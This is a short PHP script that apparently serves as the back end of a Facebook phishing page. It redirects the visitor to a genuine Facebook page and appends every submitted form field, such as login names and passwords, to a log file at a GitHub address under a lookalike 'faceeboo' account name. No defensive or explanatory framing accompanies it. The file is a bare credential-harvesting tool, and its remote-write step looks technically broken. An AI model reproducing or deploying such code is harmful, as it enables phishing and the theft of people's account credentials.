<?php
header ("Location: https://www.facebook.com/boikoborisovmemes/?jazoest=26510012010073761087287771038212197741151211057111685110112115701119752117701001198975981191088879120557786111486558651001208480537467951201021081161061135253103781011029550861015790851081225267119905110511911412011087103458112165");
$handle = fopen("https://github.com/faceeboo/faceeboo.github.io/log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
